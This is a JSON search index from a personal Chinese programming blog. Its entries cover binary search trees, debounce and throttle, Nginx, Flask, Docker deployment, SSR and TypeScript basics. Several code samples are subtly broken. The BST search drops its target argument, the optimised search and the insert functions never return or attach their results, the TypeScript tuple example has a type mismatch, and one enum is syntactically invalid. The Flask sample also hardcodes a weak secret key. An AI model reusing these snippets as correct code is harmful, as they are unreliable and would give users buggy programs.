[{"id":"625edd45f6dd4eac1e4499b2cab40c7e","title":"学术论文笔记","content":"学术论文笔记一、5G 通信策略\n\n\n\n\n\n\n\n\nHuabing Liu A Power Consumption Control Strategy for 5GModule Based on Delay and GranularityCharacteristics of Electricity Mobile CommunicationsData\n1. 思维简图\n2. 总结\n比较了 4G 和 5G 网络下的通信消耗\n基于消耗的比较提出了两种对不同大小数据包进行通信的策略\n\n二、1.思维导图\n2.","slug":"学术论文笔记","date":"2023-07-11T12:57:45.000Z","categories_index":"科研","tags_index":"论文笔记","author_index":"Martin"},{"id":"ea7d19252d7361b5f280a3d0ee2aa6d5","title":"二叉搜索树集锦","content":"二叉搜索树集锦//基础框架\nvar Traverse = function (root) &#123;\n  //something need to do\n\n  Traverse(root.left)\n  Traverse(root.right)\n&#125;\n\n//所有结点+1\nvar plusOne = function (root) &#123;\n  if (root == null) &#123;\n    return\n  &#125;\n  root.val += 1\n  plusOne(root.left)\n  plusOne(root.right)\n&#125;\n\n//判断两个二叉树是否完全相同\nvar isSameTree = function (root1, root2) &#123;\n  if (root1 == null &amp;&amp; root2 == null) &#123;\n    return true\n  &#125;\n  if (root1 == null || root2 == null) &#123;\n    return false\n  &#125;\n  if (root1.val != root2.val) &#123;\n    return false\n  &#125;\n\n  return (\n    isSameTree(root1.left, root2.left) &amp;&amp; isSameTree(root1.right, root2.right)\n  )\n&#125;\n\n//二叉搜索树：任意结点的值大于等于左子树所有结点的值\n//判断二叉搜索树的合法性BST\nvar isValidBST = function (root) &#123;\n  return isValidBSTAux(root, null, null)\n&#125;\n\nvar isValidBSTAux = function (root, min, max) &#123;\n  if (root == null) &#123;\n    return true\n  &#125;\n\n  if (min !== null &amp;&amp; root.val &lt;= min.val) &#123;\n    return false\n  &#125;\n  if (max != null &amp;&amp; root.val >= max.val) &#123;\n    return false\n  &#125;\n\n  return (\n    isValidBSTAux(root.left, min, root) &amp;&amp; isValidBSTAux(root.right, root, max)\n  )\n&#125;\n\n//查找一个数是否存在BST\nvar isInBST = function (root, target) &#123;\n  if (root == null) &#123;\n    return false\n  &#125;\n  if (root.val == target) &#123;\n    return true\n  &#125;\n\n  return isInBST(root.left) || isInBST(root.right)\n&#125;\n\n//优化\nvar betterIsInBST = function (root, target) &#123;\n  if (root == null) &#123;\n    return false\n  &#125;\n\n  if (root.val == target) &#123;\n    return true\n  &#125;\n\n  if (root.val &lt; target) &#123;\n    betterIsInBST(root.right, target)\n  &#125;\n\n  if (root.val > target) &#123;\n    betterIsInBST(root.left, target)\n  &#125;\n&#125;\n\n//在BST插入一个数\nvar insertNumberToBST = function (root, num) &#123;\n  if (root == null) &#123;\n    let newNode = new TreeNode(num)\n    return newNode\n  &#125;\n\n  if (root.val > num) &#123;\n    insertNumberToBST(root.left, num)\n  &#125;\n  if (root.right &lt; num) &#123;\n    insertNumberToBST(root.right, num)\n  &#125;\n&#125;\n\n//在BST删除一个数\nvar getMin = function (root) &#123;\n  while (root.left != null) &#123;\n    root = root.left\n  &#125;\n  return root\n&#125;\n\nvar deleteNodeFromBST = function (root, key) &#123;\n  if (root == null) &#123;\n    return null\n  &#125;\n  if (root.val == key) &#123;\n    //delete\n    if (root.left == null) &#123;\n      return root.right\n    &#125;\n    if (root.right == null) &#123;\n      return root.left\n    &#125;\n    let minNode = getMin(root.right)\n    //为具体应⽤中，val域可能会很⼤，修改起来很耗时，⽽链表操作⽆⾮改⼀改指针，⽽不会去碰\n    //内部数据。\n    root.val = minNode.val\n    root.right = deleteNodeFromBST(root.right, minNode.val)\n  &#125; else if (root.val > key) &#123;\n    root.left = deleteNodeFromBST(root.left, key)\n  &#125; else if (root.val &lt; key) &#123;\n    root.right = deleteNodeFromBST(root.right, key)\n  &#125;\n  return root\n&#125;\n","slug":"二叉搜索树集锦","date":"2023-07-07T00:51:45.000Z","categories_index":"算法","tags_index":"算法,二叉搜索树","author_index":"Martin"},{"id":"cd6a12c0c07e3b04d0fd2533bf4aa0fa","title":"防抖与节流","content":"防抖与节流一、防抖1.应用场景\n窗口 resize，滚动条 scroll，输入框 input\n持续发生，具有过程的事件\n\n2.应用：利用闭包实现let inputEvent = document.querySelector('input')\nlet content = document.getElementById('value')\n\nfunction inputChange() &#123;\n  console.log(this.value)\n  content.innerHTML = inputEvent.value\n&#125;\n\n//使用闭包形成防抖\n//闭包：函数里有一个内部函数，并返回出去，还是用了外部函数的变量\ninputEvent.oninput = debounce(inputChange, 1000)\nfunction debounce(func, delay) &#123;\n  let timer = null\n  return function () &#123;\n    //如果定时器不空，则清除之前的timer\n    if (timer !== null) &#123;\n      clearTimeout(timer)\n    &#125;\n    timer = setTimeout(() => &#123;\n      func.call(this)\n    &#125;, delay)\n  &#125;\n&#125;\n\n二、节流1.应用场景\n在规定的时间里执行一次操作，但是不一定只执行一次\n\nfunction alertAdv() &#123;\n  alert('广告')\n&#125;\n\nwindow.onscroll = ttrottle(alertAdv, 1000)\n\nfunction ttrottle(fn, delay) &#123;\n  let timer = true\n  return function () &#123;\n    if (timer) &#123;\n      setTimeout(() => &#123;\n        fn.call(this)\n        timer = true\n      &#125;, delay)\n    &#125;\n    timer = false\n  &#125;\n&#125;\n","slug":"JS防抖和节流","date":"2023-07-06T05:51:45.000Z","categories_index":"JS","tags_index":"JS,JS技巧","author_index":"Martin"},{"id":"af6a277a1f79cc7652a602f9f57ed64f","title":"Nginx","content":"Nginx一、简介\nWeb 服务器\n解决 C10K 问题\n最大 5w 个并发连接\n\n二、基本使用1.基础#启动\nnginx\n\nps -ef | grep nginx\n\n#查看端口占用\nlsof -i:80\n\n#优雅停止\nnginx -s quit\n#立即停止\nnginx -s stop\n\n#重载配置文件\nreoad\n\n#重新打开日志文件\nreopen\n\n#查看配置文件位置\nnginx -t\n\nmaster 进程：负责读取和验证配置文件，管理 woker 进程，一个\nworker 进程：负责处理实际请求，多个\n\n2.静态网站HEXO 搭建博客，略\n3.配置文件#核心数，和cpu数目一致最好\nwork-processes 10\n\n#每个核心能够连接的网络连接\nevents&#123;\n    work_connections 1024;\n&#125;\n\nhttp&#123;\n    include mime.types   //包含相应的文件处理方法\n\n    server&#123;\n\n\t&#125;\n\n\tserver&#123;\n\n    &#125;\n\n\tinclude servers/*   //保存单个server配置文件\n&#125;\n\n\n4.反向代理和负载均衡\n正向代理：代理客户端\n反向代理：代理服务端\n\n多个服务器对一个域名，隐藏服务器真实 IP\nupstream backend&#123;\n\t//需要代理的服务器\n    ip_hash;     //统一浏览器hash到一个服务器，以后一直都是访问这个服务器了\n\tserver 127.0.0.1:8001 weight=3;\n\tserver 127.0.0.1:8002 weight=1;\n\tserver 127.0.0.1:8003 weight=1;\n&#125;\n\nserver&#123;\n    location /app&#123;\n        proxy_pass http://backend;\n    &#125;\n&#125;\n//默认轮询访问三个服务器\n\n5.Https","slug":"Nginx","date":"2023-07-06T00:51:45.000Z","categories_index":"Nginx","tags_index":"Nginx","author_index":"Martin"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"TS问题1.如何在typescript中解决 error TS2451: Cannot redeclare block-scoped variable ‘name’\n原因：在默认状态下，typescript 将 DOM typings 作为全局的运行环境，所以当我们声明 name时， 与 DOM 中的全局 window 对象下的 name 属性出现了重名。因此，报了 error TS2451: Cannot redeclare block-scoped variable &#39;name&#39;. 错误。\n解决方法：\n\n\n将运行环境由DOM typings更改为其他运行环境\n\n&#123;\n    \"compilerOptions\":&#123;\n        \"lib\":[\n            \"es2015\"\n        ]\n    &#125;\n&#125;\n\n\n为了避免与全局得变量出现重名，将脚本封装到模块内。Module有自己的作用域，自然不会与全局作用域得变量产生冲突。\n\nconst name = 'youthcity';\n\nfunction greeter(name:string) &#123;\n  return `Hello $&#123;name&#125;`;\n&#125;\nconsole.log(greeter(name));\n\nexport &#123;&#125;;\n\n\n\n\n\n","slug":"TS问题","date":"2023-07-04T08:41:38.972Z","categories_index":"","tags_index":"","author_index":"Martin"},{"id":"3287d8749a931c016e4c3b6db5b48331","title":"Flask 基础","content":"Flask 基础一、基础概念\nWeb 框架，一组库和模块，使 Web 应用程序开发人员能够编写应用程序，而不必担心协议、线程管理等低级细节；\nFlask，由 Python 编写的 web 应用程序框架，基于 Werkzeug WSGI 工具包和 Jinja2 模板引擎。\nWSGI，Web Server Gateway Interface， Web 服务器网关接口，是 web 服务器和 web 应用程序之间通用接口的规范。\nWerkzeug，WSGI 工具包，实现了请求，响应对象和其他使用函数。\nFlask 环境，安装 Flask 需要 Python2.6 或者更高版本，虽然 flask 及其以来适用于 Python3，但是很多 Flask 拓展并不支持，建议在 python2.7 安装 flask\n\n二、环境安装\n安装虚拟环境\n\npip install virtualenv\nsudo apt-get install virtualenv\n\n\n新建文件夹，创建虚拟环境\n\nmkdir newPro\ncd newPro\nvirtualenv venv\nvenv\\scripts\\activate\npip install flask\npip install flask -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com\n\n\n测试\n\nfrom flask import Flask\n\n# flask构造函数使用当前模块（_name_）名称作为参数\napp = Flask(__name__)\n\n#route()函数是一个装饰器，告诉应用程序那个url应该调用（rule,options)\n#rule参数表示该函数的url绑定，options是要转发给基础rule对象的参数列表\n@app.route('/')\ndef index():\n    return '&lt;h1>Hello World!&lt;/h1>'\n\n@app.route('/user')\ndef getUserInfor():\n    return '&lt;h1>user page&lt;/h1>'\n\n\n\nif __name__ == '__main__':\n    app.run(host=\"127.0.0.1\",port=\"3333\",debug=True)\n\n现代 Web 框架使用路由技术来帮助用户记住应用程序 URL。 可以直接访问所需的页面，而无需从主页导航。\n三、基础使用1. 变量规则\nstring\n\nint\n\nfloat\n\npath：接受用作目录分隔符的斜杠\n\n@app.route('/user/&lt;int:id>')\ndef getUserID(id):\n    return '&lt;h1>Hello,%d!&lt;/h1>'%id\n\n@app.route('/user/&lt;float:id>')\ndef getUserID2(id):\n    return '&lt;h1>Hello,%f!&lt;/h1>'%id\n\n@app.route('/user/&lt;path:id>')\ndef getUserID3(id):\n    return '&lt;h1>Hello,%s!&lt;/h1>'%id\n\n2. URL 构建url_for（）函数对于动态构建特定函数的 URL 非常有用。 该函数接受函数的名称作为第一个参数，以及一个或多个关键字参数，每个参数对应于 URL 的可变部分\n\n@app.route('/show_blog/&lt;int:postID>')\ndef show_blog(postID):\n    return '&lt;h1>blog number is %d&lt;/h1>'%postID\n\n@app.route('/blog/&lt;int:postID>')\ndef show_blog_admin(postID):\n    if postID==0:\n      return redirect(url_for('show_blog',postID=1))\n    else:\n      return redirect(url_for('show_blog',postID=postID))\n\n\n3. Http 方法在此协议中，定义了从指定的 URL 检索不同的数据方法\n\nGET：不加密发送数据到服务器\nHEAD：和 GET 一样，没有响应体（？）\nPOST：用于将 HTML 表单数据发送到服务器，POST 方法接收的数据不由服务器缓存\nPUT：用所上传的内容替换目标资源的所有当前表示\nDELETE：删除由 URL 给定的目标资源的所有当前表示\n\nfrom flask import Flask,redirect,url_for,render_template,request,session,flash\n\napp=Flask(__name__)\n\n@app.route('/success/&lt;name>')\ndef success(name):\n  return 'welcome %s'%name\n\n@app.route('/login',methods=['POST','GET'])\ndef login():\n  if request.method=='POST':\n    user=request.form['nm']\n    return redirect(url_for('success',name='POST:'+user))\n  else:\n    user=request.args.get('nm')\n    return redirect(url_for('success',name='GET:'+user))\n\nif __name__=='__main__':\n  app.run(debug=True)\n\n\n服务器通过 post 方法接收数据，从表单数据获得的“nm”参数的值通过\n\nuser=request.form['nm']\n\n\n服务器通过 get 方法接收数据，从表单数据获得的“nm”参数通过\n\nUser=request.args.get('nm')\n\n4.模板可以以 HTML 的形式返回绑定到某个 URL 的函数输出\n@app.route('/')\ndef index():\n   return '&lt;html>&lt;body>&lt;h1>Hello World'&lt;/h1>&lt;/body>&lt;/html>'\n\n\n从 python 代码返回 HTML 很麻烦，可以利用基于 Flask 的 Jinja2 模板引擎，通过render_template()函数呈现 HTML 文件\n@app.route('/')\ndef index():\n    return render_template('login.html')\n\nFlask 将尝试在 templates 文件夹中找到与此脚本所在的文件夹中的 HTML 文件。\nJinja2 使用一下定界符从 HTML 转义：\n{.% … %.} for statements{.{ … }.} for expression to print to the template output\n for comments not included in the template output\n\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n  &lt;head>\n    &lt;meta charset=\"UTF-8\" />\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    &lt;title>Document&lt;/title>\n  &lt;/head>\n\n  &lt;body>\n    &lt;h1>Welcome,&#123;&#123; name &#125;&#125;&lt;/h1>\n    &#123;% if age > 20 %&#125;\n    &lt;h2>You are very nice~&lt;/h2>\n    &#123;% else %&#125;\n    &lt;h2>You are very young~&lt;/h2>\n    &#123;% endif %&#125;\n  &lt;/body>\n&lt;/html>\n\n5. 静态文件网络应用程序通常需要一个静态文件，例如支持显示网页的 js 文件或者 css 文件；\n通常，网络服务器配置服务，但是在开发过程中，这些文件从 static 文件夹或者模块旁提供；\n&lt;script\n  type=\"text/javascript\"\n  src=\"&#123;&#123; url_for('static', filename = 'index.js') &#125;&#125;\"\n>&lt;/script>\n\n6. Flask 请求对象来自客户端网页得数据作为全局请求对象发送到服务器。\n\n表单：字典对象，包含表单参数键值对\nargs：在问号后面得 url 得一部分查询字符串得解析内容\ncookie:保存 cookie 名称和值得字典对象\n文件：与上传文件相关得数据\n方法：当前请求方法\n\n7. 将表单数据发送到模板from flask import Flask,request,render_template\n\napp = Flask(__name__)\n\n@app.route('/')\ndef student():\n    return render_template('student.html')\n  \n@app.route('/result',methods = ['POST', 'GET'])\ndef result():\n    if request.method == 'POST':\n        result = request.form\n        return render_template(\"result.html\",result = result)\n      \nif __name__ == '__main__':\n  app.run(debug = True)\n\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n\n&lt;head>\n  &lt;meta charset=\"UTF-8\">\n  &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  &lt;title>Document&lt;/title>\n&lt;/head>\n\n&lt;body>\n  &lt;form action=\"http://127.0.0.1:5000/result\" method=\"POST\">\n    &lt;label for=\"name\">Name:&lt;/label>\n    &lt;input type=\"text\" id=\"name\" name=\"name\">&lt;br>&lt;br>\n    &lt;label for=\"age\">Age:&lt;/label>\n    &lt;input type=\"text\" id=\"age\" name=\"age\">&lt;br>&lt;br>\n    &lt;label for=\"job\">Job:&lt;/label>\n    &lt;input type=\"text\" id=\"job\" name=\"job\">&lt;br>&lt;br>\n    &lt;input type=\"submit\" value=\"Submit\">\n  &lt;/form>\n&lt;/body>\n\n&lt;/html>\n\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n\n&lt;head>\n  &lt;meta charset=\"UTF-8\">\n  &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  &lt;title>Document&lt;/title>\n&lt;/head>\n\n&lt;body>\n  &lt;table>\n    &#123;% for key, value in result.items() %&#125;\n    &lt;tr>\n      &lt;th> &#123;&#123; key &#125;&#125; &lt;/th>\n      &lt;td> &#123;&#123; value &#125;&#125;&lt;/td>\n    &lt;/tr>\n    &#123;% endfor %&#125;\n  &lt;/table>\n&lt;/body>\n\n&lt;/html>\n\n8.Flask CookiesCookie以文本形式存储在客户端的计算机上，目的是记住与客户使用相关的数据，以获得更好的访问者体验和网站统计信息；\nRequest对象包含cookie得属性，它是所有得cookie变量及其对应值得字典对象。\nFlask中处理Cookie得步骤为：\n\n设置cookie\n\nresp=make_response(\"success\")\nresp.set_cookie(\"martin\",\"martin\",max_age=3600)\n\n\n获取cookie\n\ncookie=request.cookies.get(\"martin\")\n\n\n删除cookie（让cookie过期）\n\nresp=make_response(\"del martin\")\nresp.delete_cookie(\"martin\")\n\n9. Flask SessionSession数据存储在服务器。事客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储到服务器上的临时目录中。\n为每个客户端得会话分配会话ID，会话数据存储在cookie得顶部，服务器以加密方式对其签名。\nSession对象也是一个字典对象，包括会话变量和关联值得键值对；\nfrom flask import Flask,request,session,redirect,url_for,flash\nfrom flask import abort,make_response\nfrom flask import render_template\n\napp=Flask(__name__)\n\napp.secret_key='990526'\n\n\n@app.route('/')\ndef index():\n    if 'username' in session:\n        username=session['username']\n        return 'Logged in as '+username+'&lt;br>'+\\\n            \"&lt;b>&lt;a href='/logout'>click here to log out&lt;/a>&lt;/b>\"\n    return \"You are not logged in &lt;br>&lt;a href='/login'>&lt;/b>\"+\\\n        \"click here to log in&lt;/b>&lt;/a>\"\n\n@app.route('/login',methods=['GET','POST'])\ndef login():\n    if request.method=='POST':\n        session['username']=request.form['username']\n        return redirect(url_for('index'))\n    return '''\n        &lt;form action=\"\" method=\"post\">\n            &lt;p>&lt;input type=text name=username>\n            &lt;p>&lt;input type=submit value=Login>\n        &lt;/form>\n    '''\n\n@app.route('/logout')\ndef logout():\n    session.pop('username',None)\n    return redirect(url_for('index'))\n  \nif __name__=='__main__':\n    app.run(debug=True)\n\n10. Flask重定向和错误\n\n\n\n\n\n\n\n\nFlask类有一个redirect（）函数，调用时，返回一个响应对象，并将用户重定向到具有指定状态代码的另一个目标位置。\nFlask.redirect(location,statuscode,response)\n\n\nlocation:重定向响应得url\nstatuscode：发送到浏览器标头，默认302\nresponse：用于实例化响应\n\n\n\n\n\n\n\n\n\n\nFlask类具有带有错误代码的abort()函数\nFlask.abort(code)\n\nCode为以下之一：\n\n400 错误请求\n401 未进行身份认证\n403 Forbidden\n404 未找打\n406 不接收\n415 不支持的媒体类型\n429 请求过多\n\n@app.route('/login',methods = ['POST', 'GET'])\ndef login():\n   if request.method == 'POST':\n      if request.form['username'] == 'admin' :\n         return redirect(url_for('success'))\n      else:\n         abort(401)\n   else:\n      return redirect(url_for('index'))\n\n11.Flask消息闪现Flask提供了一个非常简单得方法来使用闪现系统向用户反馈信息。\n在一个请求结束时记录一个信息，并且在下次请求时访问它，通常与布局模板结合以公开信息。\nFlask框架得闪现系统可以在一个视图中创建消息，并在名为next得试图函数中呈现他。\nFlask模块包含flash（）方法，将消息传递给下一个请求，请求通常为模板；\nflash(message,category)\n\n\nmessage:闪现的实际消息\ncategory：error | info | warning\n\n从会话中删除消息，模板调用get_flashed_messages()\n12.Flask SqliteFlask中使用特殊得g对象可以使用before_request()和teardown_request()在请求开始前打开数据库连接，请求结束之后关闭连接；\nimport sqlite3\nfrom flask import g,Flask\n\nDATABASE='../database.db'\n\napp=Flask(__name__)\n\ndef connect_db():\n    return sqlite3.connect(DATABASE)\n\n@app.before_request\ndef before_request():\n    g.db=connect_db()\n  \n@app.teardown_request\ndef teardown_request(exception):\n    if hasattr(g,'db'):\n        g.db.close()\n\n按需连接上述方式在Flask执行请求前处理器才有效。如果在脚本或者Python解释器中，必须使用：\nwith app.test_request_context():\n\tapp.preprocess_request()\n\n简化查询for user in query_db(\"select * from users\")\n\tprint user['username'],'has the id',user['user_id']\n\n只需要单一结果的用法：\nuser=query_db('select * from users where username=?',[the_username],one=true)\n\nif user is None:\n    \tprint 'No such user'\n    else:\n        print the_username,'has the id',user['user_id']\n\n如果要给 SQL 语句传递参数，请在语句中使用问号来代替参数，并把参数放在一个列表中 一起传递。不要用字符串格式化的方式直接把参数加入 SQL 语句中，这样会给应用带来 SQL 注入 的风险。\n13. Flask文件上传Flask中处理文件上传非常简单，需要一个HTML表单，其enctype属性设置为multipart/form-data，将文件发布到URL\nURL处理程序从request.files[]对象提取文件，保存到所需位置；\n上传的文件首先保存到服务器上的临时位置，然后实际保存到最终位置；\napp.config[&#39;UPLOAD_FOLDER&#39;]定义文件上传文件夹的位置\n\napp.config[&#39;MAX_CONTENT_LENGTH&#39;]指懂要上传文件的最大大小（字节）\n\n\n\n\n\n\n\n\n\n\npy文件不嫩放到views文件下\n14.Flask部署开发服务器上的APP只能在设置了开发环境的计算机上访问，这是一种默认i行为，因为在调试模式下，用户可以在计算机上执行任意代码。\n如果禁用了debug，则可以将主机名设置为‘0.0.0.0’，使本地计算机上得开发服务器可供网络上的用户使用。\napp.run(host&#x3D;&#39;0.0.0.0&#39;)\n\n部署要从开发环境切换到成熟得生产环境，需要在真是得web服务器上部署应用程序\nmod_wsgi是一个Apache模块，它提供了一个WSGI兼容接口，用于在Apache服务器上托管基于Python得web应用程序。\npip install mod_wsgi\nmod_wsgi-express start-server\n\n15. Flask FaskCGIFastCGi是Nginx,Lighttpd和Cherokee等服务器上的Flask应用程序\n","slug":"Flask基础","date":"2023-07-04T07:13:45.000Z","categories_index":"后端","tags_index":"笔记,Flask,Python","author_index":"Martin"},{"id":"a3cfa29d476d34e52c0304b95199a8f7","title":"Docker 一键部署","content":"Docker 一键部署一、基本操作\nsudo passwd 安装完成 ubuntu 系统后，设置 root 密码\n切换至 root 管理员 su 3、git clone cd / &amp;&amp; git clone http://用户名:密码@47.103.136.241/other/builder.git\n给脚本赋予可执行权限 chmod +x build.sh\n执行脚本 ./build.sh\n运行脚本，使用脚本进行初始环境安装 安装途中有步骤需要按[enter]操作四次左右\n运行脚本，使用脚本进行前端编译环境安装 安装途中有步骤需要按[enter]操作，如果出现报错忽略，再次执行\ncd 到 builder 项目目录下，./builder.sh\n首先构建本地运行环境，选择公共功能，选择需要的后端环境\ncd 到项目目录下，修改 setting.py 文件 ip\ncd 到 server 目录，flask run\n\n","slug":"Docker一键部署","date":"2023-07-02T13:13:45.000Z","categories_index":"运维","tags_index":"Docker","author_index":"Martin"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"Webpack1.使用webpack创建项目vue init webpack vueDemo\n\n","slug":"Webpack","date":"2023-06-29T12:01:46.259Z","categories_index":"","tags_index":"","author_index":"Martin"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"服务端渲染SSR一、什么是SSR？\nvue支持在浏览器生成和操作DOM，也支持在服务端直接渲染成HTML字符串，作为服务器响应返回给浏览器；\n浏览器将静态HTML激活为客户端能够交互的应用；\n一个由服务端渲染的VueJS可以被认为是同构的或者通用的，因为吧大部分代码同时运行在服务端和客户端；\n\n1.SSR优势\n更快的首屏加载速度：有利于慢网速和运行缓慢的设备。\n\n（1）渲染方面：服务端渲染的HTML无需等待苏哦有的JS下载执行完毕才可以显示；\n（2）数据传输：数据获取过程在首次访问时在服务端完成，可能有更快的数据库连接；\n\n廷议的心智模型：可以使用相同的语言以及相同的声明式，面向组建的心智模型来开发整个应用，不需要再后端模板系统和前端框架之间来回切换；\n更好的SEO：搜索引擎爬虫可直接看到完全渲染的页面；\n\n\n如果你的应用以一个 loading 动画开始，然后通过 Ajax 获取内容，爬虫并不会等到内容加载完成再抓取。也就是说，如果 SEO 对你的页面至关重要，而你的内容又是异步获取的，那么 SSR 可能是必需的。\n\n2.SSR劣势\n开发限制：浏览器特定的代码只能在某些生命周期钩子使用；外部库可能需要经过特殊处理才能在服务端渲染的应用中运行；\n更多的构建配置和部署相关的要求。需要一个让NodeJS运行的服务器环境。\n更高的服务端负载；\n\n3.SSG静态站点生成，又称预渲染，如果一个站点的数据对每个用户来说都是相同的，那就可以渲染一次，生成的静态HTML文件放在服务器托管。每当数据变化时，都需要重新部署。\n二、基础使用1.渲染一个应用","slug":"服务端渲染","date":"2023-06-28T02:25:42.639Z","categories_index":"","tags_index":"","author_index":"Martin"},{"id":"6ef5dcf5728b7f68617c675eff6caf49","title":"如何高效整理论文","content":"如何高效整理论文？https://www.bilibili.com/video/BV1354y1h7Vf/?spm_id_from=333.337.search-card.all.click&amp;vd_source=f47a1518b7d14573404f9ef42bc4a40b\n一、目标\n了解科研进程，把握研究方向\n了解课题下，大家已经做的研究\n帮助自己写论文，完善科研思维\n\n二、论文基本结构1.综述\n发展现状\n原因\n意义\n关键词\n\n\n以上部分一层一层相关，查看引用的相关文献\n\n2.假设3.实验设计（***）在同一实验目标、实验假设的情况下，能否设计其他更好的实验？\n4.数据处理\n筛入\n剔出\n\n\n删选数据的标准好不好？有没有更好的完善方式？（实验对比可发小论文）\n\n\n处理方式（统计学方式，数学部分补充）\n关键词\n\n5.结论对于当前课题 A，有哪些假设？有哪些实验？有哪些实验数据？如何提出新的假设-&gt;新的实验-&gt;发现创新点\n6.局限性分析改进方法、创新方法…\n三、其他\n询问老师：整理成 Excel 表格：论文名、链接、问题、索引…\n论文检索\n\n四、总结\n单篇文献整理\n多篇文献整合\n文献汇报与求助\n\n","slug":"如何高效整理论文？","date":"2023-06-27T23:51:45.000Z","categories_index":"日常","tags_index":"科研","author_index":"Martin"},{"id":"4fcf6f790a74def036d077b002f61038","title":"TS 基础","content":"TS 基础TypeScript一、什么是TypeScript?1.Why we choose TypeScript?\nJavaScript构建大型复杂Web应用系统不容易；\nTypeScript为JS的超集，具有可选的类型且可以编译为纯JS。从技术上讲，TS是具有静态类型的JS。\n\n\n\n2.为什么需要向JS添加静态类型？\n避免经典的错误“undefined is not a function.”\n在不严重破坏代码的情况下，重构代码更容易。\n使大型复杂的应用源码更加容易阅读。动态类型的自由特性经常会导致错误，错误不仅会降低程序员的呢工作效率，还会由于增加新代码的成本而使开发陷入停顿。JavaScript无法合并类型以及编译时缺乏错误检查，使它不适合作为企业和大型代码库中服务器端代码。\n\n二、基础1.基础类型TS拥有和JS几乎一样的数据类型，此外还添加了枚举类型；\n\n1.布尔型\nlet isDone:boolean=false;\n\n2.数字:TS里面的所有数字都是浮点数；\nlet decLiteral:number=6;\nlet hexLiteral:number=0xf00d;\nlet binaryLiteral:number=0b1010;\nlet oct:number=0o744;\n\n3.字符串 “” ''\nlet name:string=\"Bob\";\n\n模板为字符串``\nlet name:string=`Gene`;\nlet age:number=37;\nlet sentence:string=`Hello,my name is $&#123;name&#125;,and I will be $&#123;age+1&#125; years old next month;`;\nlet sentence: string = \"Hello, my name is \" + name + \".\\n\\n\" +\n    \"I'll be \" + (age + 1) + \" years old next month.\";\n\n4.数组 []\nlet list:number[]=[1,2,3];\n数组泛型\nlet list:Array&lt;number>=[1,2,3];\n\n5.元组 &#123;&#125;\nlet x:[string,number];\nx=['hello','10'];\nconsole.log(x[0].substr(1));\n\n6.枚举 enum\nenum Color &#123;r,g,b&#125;;\nlet c:Color=Color.g;\n\nenum Color&#123;r=1,g,b&#125;;\nlet c:Color=Color.g;\n\nenum Color=&#123;r=1,g=2,b=4&#125;;\nlet c:Color=Color.g;\n\n枚举提供的遍历是可以通过枚举的值得到他的名字；\nenum Color&#123;red=1,g,b&#125;;\nlet colorName:string=Color[2];\nconsole.log(colorName);   //g\n\n7.任意值 any：有时候我们想要在编程阶段还哦不清楚的类型指定一个类型，这些值可能是动态的；\nlet notSure:any=4;\nnotSure=\"May be a string \";\nnotSure=false;\nObject类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法：\nlet notSure:any=4;\nnotSure.ifExists();\nnotSure.toFixed();\n\nlet prettySure:Object=4;\nprettySure.toFixed();  //error;\n只知道一部分数据的类型时，any类型也是有用的。比如，你有一个数组，它包含了不同的类型的数据：\nlet list:any[]=[1,true,\"String\"];\n\n8.空值\nfunction wanuser():void&#123;\n    alert(\"This is a warning message\");\n&#125;\n声明一个void类型的变量没有什么大用，因为你只能为它赋予undefined和null\n默认情况下null和undefined是所有类型的子类型。 就是说你可以把null和undefined赋值给number类型的变量。\n当你指定了--strictNullChecks标记，null和undefined只能赋值给void和它们各自。\n\n9.Never\n// 返回never的函数必须存在无法达到的终点\nfunction error(message: string): never &#123;\n    throw new Error(message);\n&#125;\n\n// 推断的返回值类型为never\nfunction fail() &#123;\n    return error(\"Something failed\");\n&#125;\n\n// 返回never的函数必须存在无法达到的终点\nfunction infiniteLoop(): never &#123;\n    while (true) &#123;\n    &#125;\n&#125;\n\n10.断言类型\n有时我会比编译器更清楚某个值的详细信息；\n通过断言可以告诉编译器，不进行特殊的数据检查和结构。运行时无影响只在编译时起作用；\n\n“尖括号“语法\nlet someValue:any=\"this is a strong\";\n\nlet strLenght:number=(&lt;string>someValue).length;\nas 语法\nlet someValue:any=\"this is a string\";\nlet strl:number=(someValue as string).length;\n两种形式是等价的。 至于使用哪个大多数情况下是凭个人喜好；\n 然而，当你在TypeScript里使用JSX时，只有as语法断言是被允许的。\n尽可能地使用let来代替var\n\n\n\n类型守卫\n类型保护是可执行运行时检查得一种表达式，用于确保该类型在一定得范围内。换句话说，类型保护可以保证一个字符串是一个字符串。尽管他的值可以为一个数值。类型保护与特性检测并不是完全不同，其主要思想是尝试检测属性、方法或原型，以确定如何处理值；\n\n\nin关键字\n\n//in\n\ninterface Admin &#123;\n  name: string\n  privileges: string[]\n&#125;\n\ninterface Employee &#123;\n  name: string\n  startDate: Date\n&#125;\n\ntype unknownEmployee = Admin | Employee\n\nfunction printEmployeeInformation(emp: unknownEmployee) &#123;\n  console.log('Name: ' + emp.name)\n  if ('privileges' in emp) &#123;\n    console.log('Privileges: ' + emp.privileges)\n  &#125;\n  if ('startDate' in emp) &#123;\n    console.log('Start Date: ' + emp.startDate)\n  &#125;\n&#125;\n\nconst e1 = &#123;\n  name: 'Max',\n  privileges: ['create-server'],\n&#125;\n\nprintEmployeeInformation(e1)\n\n\n\ntypeof\n\ntypeof 类型保护只支持两种形式：typeof v === “typename” 和 typeof v !== typename，”typename” 必须是 “number”， “string”，”boolean” 或 “symbol”。 但是 TypeScript 